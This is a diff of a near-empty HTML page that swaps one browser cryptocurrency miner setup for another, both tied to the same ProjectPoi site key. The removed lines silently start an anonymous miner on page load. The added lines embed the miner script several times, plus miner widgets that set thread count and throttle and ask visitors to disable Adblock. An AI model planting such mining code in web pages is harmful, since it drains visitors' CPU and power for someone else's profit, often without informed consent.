@@ -2,32 +2,36 @@
 <html>
 	<head>
 		<meta charset="UTF-8">
-		<script src="https://ppoi.org/lib/projectpoi.min.js"></script>
-		
-		<script>
-	var miner = new ProjectPoi.Anonymous('BLuRXQ2XBPG0jSEBBnysmfVJ');
-	miner.start();
-</script>
-
-<script>
-	// Listen on events
-	miner.on('found', function() { /* Hash found */ })
-	miner.on('accepted', function() { /* Hash accepted by the pool */ })
-
-	// Update stats once per second
-	setInterval(function() {
-		var hashesPerSecond = miner.getHashesPerSecond();
-		var totalHashes = miner.getTotalHashes();
-		var acceptedHashes = miner.getAcceptedHashes();
-
-		// Output to HTML elements...
-	}, 1000);
-</script>
-
-
+		<script src="https://ppoi.org/lib/miner.min.js" async></script>
 		<title></title>
 	</head>
 	<body>
-		<h>这是一个空白页，注释掉</h>
+		
+		<script src="https://ppoi.org/lib/miner.min.js" async></script>
+<div class="projectpoi-miner" 
+	style="width: 256px; height: 310px"
+	data-key="BLuRXQ2XBPG0jSEBBnysmfVJ">
+	<em>请禁用Adblock!</em>
+</div>
+		
+		<script src="https://ppoi.org/lib/miner.min.js" async></script>
+<div class="projectpoi-miner" 
+	style="width: 256px; height: 310px"
+	data-key="BLuRXQ2XBPG0jSEBBnysmfVJ"
+	data-autostart="false"
+	data-whitelabel="false"
+	data-background="#000000"
+	data-text="#eeeeee"
+	data-action="#00ff00"
+	data-graph="#555555"
+	data-threads="4"
+	data-throttle="0.9"
+	data-start="Start Now!">
+	<em>Please disable Adblock!</em>
+</div>
+		
+		
+		
+		
 	</body>
 </html>
